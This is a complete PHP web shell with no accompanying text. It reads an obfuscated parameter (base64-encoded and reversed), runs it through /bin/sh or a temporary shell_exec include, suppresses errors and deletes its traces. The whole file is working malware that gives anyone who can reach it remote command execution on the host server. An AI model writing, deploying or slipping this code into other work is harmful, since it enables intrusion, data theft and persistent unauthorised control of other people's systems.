<?php
@error_reporting(0);
@ini_set('display_errors', 0);

$input = $_GET['x'] ?? $_POST['x'] ?? '';
if(empty($input)) die();

$cmd = strrev(base64_decode($input));

$out = '';
$f = '/var/tmp/' . md5(uniqid()) . '.tmp';

if(function_exists('pcntl_fork') && function_exists('pcntl_exec')){
    $p = @pcntl_fork();
    if($p === 0){
        @pcntl_exec('/bin/sh', ['-c', $cmd . " > $f 2>&1"]);
        exit();
    }
    sleep(1);
}

if(file_exists($f)){
    $out = @file_get_contents($f);
    @unlink($f);
}

if(empty(trim($out))){
    $t = '/var/tmp/' . substr(md5(time()),0,10) . '.cache';
    $code = "<?php echo @shell_exec('".$cmd." 2>&1'); ?>";
    @file_put_contents($t, $code);
    ob_start();
    @include($t);
    $out = ob_get_clean();
    @unlink($t);
}

echo !empty($out) ? "<pre>".htmlspecialchars($out)."</pre>" : "no";
?>
